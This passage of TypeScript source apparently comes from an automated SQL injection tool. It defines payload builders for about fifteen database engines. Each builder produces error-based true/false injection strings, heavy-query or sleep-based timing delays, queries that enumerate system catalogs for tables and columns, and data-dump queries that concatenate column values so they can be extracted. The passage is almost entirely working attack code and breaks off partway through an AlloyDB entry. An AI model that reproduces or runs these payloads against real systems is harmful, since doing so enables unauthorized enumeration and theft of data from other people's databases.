      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table.toLowerCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    });

    // ─── Extended Dialect Registrations & Native Capability Mappings ─────────
    const pgBase = this.capabilities.get('PostgreSQL')!;
    const mysqlBase = this.capabilities.get('MySQL')!;
    const mssqlBase = this.capabilities.get('Microsoft SQL Server')!;
    const genericBase = this.capabilities.get('Generic SQL')!;

    // ─── Amazon Redshift (Native: does NOT support pg_sleep, uses LISTAGG & computational delay) ───
    this.capabilities.set('Amazon Redshift', {
      dbms: 'Amazon Redshift',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS integer)`,
      castToString: (expr) => `CAST((${expr}) AS varchar(4096))`,
      runtimeExceptionTrue: '1/(SELECT 0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `LISTAGG(CAST(${expr} AS varchar), '${sep}') WITHIN GROUP (ORDER BY 1)`,
      sleepFn: (seconds) => `(SELECT count(*) FROM (SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3) a, (SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3) b WHERE ${seconds}>0)`,
      versionQuery: 'SELECT version()',
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM svv_columns WHERE table_name='${table.toLowerCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `COALESCE(CAST(${c} AS varchar),'')`).join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    });

    // ─── DuckDB (Native: range delay, array_to_string, DuckDB system tables) ───
    this.capabilities.set('DuckDB', {
      dbms: 'DuckDB',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS BIGINT)`,
      castToString: (expr) => `CAST((${expr}) AS VARCHAR)`,
      runtimeExceptionTrue: '1/(SELECT 0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `string_agg(CAST(${expr} AS VARCHAR), '${sep}')`,
      sleepFn: (seconds) => `(SELECT count(*) FROM range(${seconds * 5000000}))`,
      versionQuery: 'SELECT version()',
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema='main' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `COALESCE(CAST(${c} AS VARCHAR),'')`).join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    });

    // ─── Trino & Presto (Native: newline comment terminator, fail() runtime error, sequence delay) ───
    const trinoCap: DialectCapabilities = {
      dbms: 'Trino',
      commentSingle: '-- ',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => `concat(${parts.join(',')})`,
      substringFn: (expr, pos, len) => `substr(${expr},${pos},${len})`,
      asciiFn: (expr) => `codepoint(cast(${expr} as varchar))`,
      charFn: (code) => `chr(${code})`,
      lengthFn: (expr) => `length(${expr})`,
      limitOffset: (limit, offset) => `OFFSET ${offset} LIMIT ${limit}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `cast((${expr}) as bigint)`,
      castToString: (expr) => `cast((${expr}) as varchar)`,
      runtimeExceptionTrue: "fail(1, 'sql injection probe verified')",
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN fail(1, 'sqli') ELSE 1 END${fromClause})=1-- \n`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN fail(1, 'sqli') ELSE 1 END${fromClause})=1-- \n`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `array_join(array_agg(cast(${expr} as varchar)), '${sep}')`,
      sleepFn: (seconds) => `(SELECT count(*) FROM (VALUES 1) t CROSS JOIN UNNEST(sequence(1, ${seconds * 2000000})))`,
      versionQuery: 'SELECT node_version FROM system.runtime.nodes LIMIT 1',
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_schema',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table.toLowerCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    };
    this.capabilities.set('Trino', trinoCap);
    this.capabilities.set('Presto', { ...trinoCap, dbms: 'Presto' });

    // ─── Vertica (Native: SLEEP(seconds) support) ───
    this.capabilities.set('Vertica', {
      ...genericBase,
      dbms: 'Vertica',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      sleepFn: (seconds) => `SLEEP(${seconds})`,
      versionQuery: 'SELECT version()',
      currentUserQuery: 'SELECT current_user()',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM v_catalog.tables LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM v_catalog.columns WHERE table_name='${table}' LIMIT ${limit} OFFSET ${offset}`,
    });

    // ─── SAP HANA ───────────────────────────────────────────────────────────
    this.capabilities.set('SAP HANA', {
      dbms: 'SAP HANA',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS INTEGER)`,
      castToString: (expr) => `CAST((${expr}) AS VARCHAR(255))`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition) => ({
        truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/0 ELSE 1 END FROM DUMMY)=1--`,
        falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/0 ELSE 1 END FROM DUMMY)=1--`,
      }),
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS VARCHAR(5000)), '${sep}')`,
      sleepFn: (seconds) => `SLEEP_SECONDS(${seconds})`,
      versionQuery: 'SELECT VERSION FROM SYS.M_DATABASE',
      currentUserQuery: 'SELECT CURRENT_USER FROM DUMMY',
      currentDbQuery: 'SELECT CURRENT_SCHEMA FROM DUMMY',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT TABLE_NAME FROM SYS.TABLES WHERE SCHEMA_NAME=CURRENT_SCHEMA LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT COLUMN_NAME FROM SYS.TABLE_COLUMNS WHERE TABLE_NAME='${table}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) =>
        `SELECT STRING_AGG(${columns.map((c) => `COALESCE(CAST(${c} AS VARCHAR(500)),'')`).join("||':::'||")}, CHAR(10)) FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit})`,
    });

    // ─── Teradata ───────────────────────────────────────────────────────────
    this.capabilities.set('Teradata', {
      dbms: 'Teradata',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTR(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `CHARACTER_LENGTH(${expr})`,
      limitOffset: (limit, offset) => `QUALIFY ROW_NUMBER() OVER (ORDER BY 1) BETWEEN ${offset + 1} AND ${offset + limit}`,
      limit1: 'TOP 1',
      castToInt: (expr) => `CAST((${expr}) AS INTEGER)`,
      castToString: (expr) => `CAST((${expr}) AS VARCHAR(255))`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition) => ({
        truePayload: `' AND (CASE WHEN (${condition}) THEN 1/0 ELSE 1 END)=1--`,
        falsePayload: `' AND (CASE WHEN (NOT (${condition})) THEN 1/0 ELSE 1 END)=1--`,
      }),
      batchAggregateRows: (expr, sep = ':::') => `TRIM(TRAILING '${sep}' FROM (XMLAGG(CAST(${expr} AS VARCHAR(500)) || '${sep}' ORDER BY 1) (VARCHAR(10000))))`,
      sleepFn: (seconds) => `(SELECT COUNT(*) FROM DBC.TablesV a CROSS JOIN DBC.TablesV b WHERE a.TableName < '${seconds}')`,
      versionQuery: "SELECT InfoData FROM DBC.DBCInfo WHERE InfoKey = 'VERSION'",
      currentUserQuery: 'SELECT USER',
      currentDbQuery: 'SELECT DATABASE',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT TableName FROM DBC.TablesV WHERE DatabaseName=DATABASE QUALIFY ROW_NUMBER() OVER (ORDER BY 1) BETWEEN ${offset + 1} AND ${offset + limit}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT ColumnName FROM DBC.ColumnsV WHERE TableName='${table}' QUALIFY ROW_NUMBER() OVER (ORDER BY 1) BETWEEN ${offset + 1} AND ${offset + limit}`,
      dataDumpQuery: (table, columns, limit = 20, where) =>
        `SELECT TOP ${limit} ${columns.join("||':::'||")} FROM ${table} ${where ? `WHERE ${where}` : ''}`,
    });

    // ─── Firebird ───────────────────────────────────────────────────────────
    this.capabilities.set('Firebird', {
      dbms: 'Firebird',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr} FROM ${pos} FOR ${len})`,
      asciiFn: (expr) => `ASCII_VAL(${expr})`,
      charFn: (code) => `ASCII_CHAR(${code})`,
      lengthFn: (expr) => `CHAR_LENGTH(${expr})`,
      limitOffset: (limit, offset) => `FIRST ${limit} SKIP ${offset}`,
      limit1: 'FIRST 1',
      castToInt: (expr) => `CAST((${expr}) AS INTEGER)`,
      castToString: (expr) => `CAST((${expr}) AS VARCHAR(255))`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition) => ({
        truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/0 ELSE 1 END FROM RDB$DATABASE)=1--`,
        falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/0 ELSE 1 END FROM RDB$DATABASE)=1--`,
      }),
      batchAggregateRows: (expr, sep = ':::') => `LIST(CAST(${expr} AS VARCHAR(500)), '${sep}')`,
      sleepFn: (seconds) => `(SELECT COUNT(*) FROM RDB$RELATIONS a CROSS JOIN RDB$RELATIONS b WHERE a.RDB$RELATION_ID < ${seconds * 10})`,
      versionQuery: "SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM RDB$DATABASE",
      currentUserQuery: 'SELECT CURRENT_USER FROM RDB$DATABASE',
      currentDbQuery: "SELECT rdb$get_context('SYSTEM', 'DB_NAME') FROM RDB$DATABASE",
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT FIRST ${limit} SKIP ${offset} RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG=0`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT FIRST ${limit} SKIP ${offset} RDB$FIELD_NAME FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME='${table}'`,
      dataDumpQuery: (table, columns, limit = 20, where) =>
        `SELECT FIRST ${limit} ${columns.map((c) => `COALESCE(CAST(${c} AS VARCHAR(255)),'')`).join("||':::'||")} FROM ${table} ${where ? `WHERE ${where}` : ''}`,
    });

    // ─── Databricks SQL ─────────────────────────────────────────────────────
    this.capabilities.set('Databricks SQL', {
      dbms: 'Databricks SQL',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => `CONCAT(${parts.join(',')})`,
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS INT)`,
      castToString: (expr) => `CAST((${expr}) AS STRING)`,
      runtimeExceptionTrue: 'ASSERT_TRUE(1=0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition) => ({
        truePayload: `' AND ASSERT_TRUE(NOT (${condition}))--`,
        falsePayload: `' AND ASSERT_TRUE(${condition})--`,
      }),
      batchAggregateRows: (expr, sep = ':::') => `CONCAT_WS('${sep}', COLLECT_LIST(CAST(${expr} AS STRING)))`,
      sleepFn: (seconds) => `(SELECT COUNT(*) FROM RANGE(0, ${seconds * 3000000}))`,
      versionQuery: 'SELECT current_version().dbr_version',
      currentUserQuery: 'SELECT current_user()',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) =>
        `SELECT CONCAT_WS('\\n', COLLECT_LIST(${columns.map((c) => `COALESCE(CAST(${c} AS STRING),'')`).join("||':::'||")})) FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit})`,
    });

    // ─── Azure Synapse ──────────────────────────────────────────────────────
    this.capabilities.set('Azure Synapse', {
      dbms: 'Azure Synapse',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '+',
      stringConcatFn: (parts) => parts.join('+'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LEN(${expr})`,
      limitOffset: (limit, offset) => `OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY`,
      limit1: 'TOP 1',
      castToInt: (expr) => `CAST((${expr}) AS INT)`,
      castToString: (expr) => `CAST((${expr}) AS NVARCHAR(MAX))`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition) => ({
        truePayload: `' AND 1=(CASE WHEN (${condition}) THEN 1/0 ELSE 1 END)--`,
        falsePayload: `' AND 1=(CASE WHEN (NOT (${condition})) THEN 1/0 ELSE 1 END)--`,
      }),
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS NVARCHAR(MAX)), '${sep}')`,
      sleepFn: (seconds) => `(SELECT COUNT(*) FROM sys.all_columns a CROSS JOIN sys.all_columns b WHERE a.column_id < ${seconds * 100})`,
      versionQuery: 'SELECT @@VERSION',
      currentUserQuery: 'SELECT SUSER_SNAME()',
      currentDbQuery: 'SELECT DB_NAME()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT name FROM sys.tables ORDER BY name OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('${table}') ORDER BY column_id OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY`,
      dataDumpQuery: (table, columns, limit = 20, where) =>
        `SELECT STRING_AGG(${columns.map((c) => `COALESCE(CAST(${c} AS NVARCHAR(MAX)),'')`).join("+':::'+")}, CHAR(10)) FROM (SELECT TOP ${limit} * FROM ${table} ${where ? `WHERE ${where}` : ''}) t`,
    });

    // ─── Apache Doris ───────────────────────────────────────────────────────
    this.capabilities.set('Apache Doris', {
      dbms: 'Apache Doris',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: ' ',
      stringConcatFn: (parts) => `CONCAT(${parts.join(',')})`,
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS INT)`,
      castToString: (expr) => `CAST((${expr}) AS STRING)`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition) => ({
        truePayload: `' AND IF(${condition}, 1/0, 1)=1-- -`,
        falsePayload: `' AND IF(NOT (${condition}), 1/0, 1)=1-- -`,
      }),
      batchAggregateRows: (expr, sep = ':::') => `GROUP_CONCAT(CAST(${expr} AS STRING), '${sep}')`,
      sleepFn: (seconds) => `sleep(${seconds})`,
      versionQuery: 'SELECT version()',
      currentUserQuery: 'SELECT current_user()',
      currentDbQuery: 'SELECT database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) =>
        `SELECT GROUP_CONCAT(${columns.map((c) => `COALESCE(CAST(${c} AS STRING),'')`).join(",':::',")}, '\\n') FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}) t`,
    });

    // ─── SingleStore ────────────────────────────────────────────────────────
    this.capabilities.set('SingleStore', {
      dbms: 'SingleStore',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: ' ',
      stringConcatFn: (parts) => `CONCAT(${parts.join(',')})`,
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${offset},${limit}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS SIGNED)`,
      castToString: (expr) => `CAST((${expr}) AS CHAR)`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition) => ({
        truePayload: `' AND IF(${condition}, 1/0, 1)=1-- -`,
        falsePayload: `' AND IF(NOT (${condition}), 1/0, 1)=1-- -`,
      }),
      batchAggregateRows: (expr, sep = ':::') => `GROUP_CONCAT(${expr} SEPARATOR '${sep}')`,
      sleepFn: (seconds) => `SLEEP(${seconds})`,
      versionQuery: 'SELECT @@version',
      currentUserQuery: 'SELECT CURRENT_USER()',
      currentDbQuery: 'SELECT DATABASE()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT ${offset},${limit}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table}' LIMIT ${offset},${limit}`,
      dataDumpQuery: (table, columns, limit = 20, where) =>
        `SELECT GROUP_CONCAT(${columns.map((c) => `COALESCE(CAST(${c} AS CHAR),'')`).join(",':::',")} SEPARATOR '\\n') FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}) t`,
    });

    // ─── Vitess ─────────────────────────────────────────────────────────────
    this.capabilities.set('Vitess', {
      dbms: 'Vitess',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: ' ',
      stringConcatFn: (parts) => `CONCAT(${parts.join(',')})`,
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${offset},${limit}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS SIGNED)`,
      castToString: (expr) => `CAST((${expr}) AS CHAR)`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition) => ({
        truePayload: `' AND /*vt+ PLAN_ROUTER */ IF(${condition}, 1/0, 1)=1-- -`,
        falsePayload: `' AND /*vt+ PLAN_ROUTER */ IF(NOT (${condition}), 1/0, 1)=1-- -`,
      }),
      batchAggregateRows: (expr, sep = ':::') => `GROUP_CONCAT(${expr} SEPARATOR '${sep}')`,
      sleepFn: (seconds) => `sleep(${seconds})`,
      versionQuery: 'SELECT @@version',
      currentUserQuery: 'SELECT CURRENT_USER()',
      currentDbQuery: 'SELECT DATABASE()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT ${offset},${limit}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table}' LIMIT ${offset},${limit}`,
      dataDumpQuery: (table, columns, limit = 20, where) =>
        `SELECT GROUP_CONCAT(${columns.map((c) => `COALESCE(CAST(${c} AS CHAR),'')`).join(",':::',")} SEPARATOR '\\n') FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}) t`,
    });

    // ─── PostgreSQL Distributed & Cloud Variants (TimescaleDB, YugabyteDB, AlloyDB) ──
    this.capabilities.set('TimescaleDB', {
      dbms: 'TimescaleDB',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS int)`,
      castToString: (expr) => `CAST((${expr}) AS text)`,
      runtimeExceptionTrue: '1/(SELECT 0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS text), '${sep}')`,
      bitandCondition: (expr, mask) => `((${expr}) & ${mask}) = ${mask}`,
      sleepFn: (seconds) => `pg_sleep(${seconds})`,
      versionQuery: "SELECT extversion FROM pg_extension WHERE extname='timescaledb'",
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT hypertable_name FROM timescaledb_information.hypertables LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table.toLowerCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `COALESCE(CAST(${c} AS text),'')`).join("||':::'||");
        return `SELECT STRING_AGG(${concatExpr}, E'\\n') FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}) t`;
      },
    });

    this.capabilities.set('YugabyteDB', {
      dbms: 'YugabyteDB',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS int)`,
      castToString: (expr) => `CAST((${expr}) AS text)`,
      runtimeExceptionTrue: '1/(SELECT 0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS text), '${sep}')`,
      bitandCondition: (expr, mask) => `((${expr}) & ${mask}) = ${mask}`,
      sleepFn: (seconds) => `pg_sleep(${seconds})`,
      versionQuery: 'SELECT yb_server_version()',
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table.toLowerCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `COALESCE(CAST(${c} AS text),'')`).join("||':::'||");
        return `SELECT STRING_AGG(${concatExpr}, E'\\n') FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}) t`;
      },
    });

    this.capabilities.set('AlloyDB', {
      dbms: 'AlloyDB',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
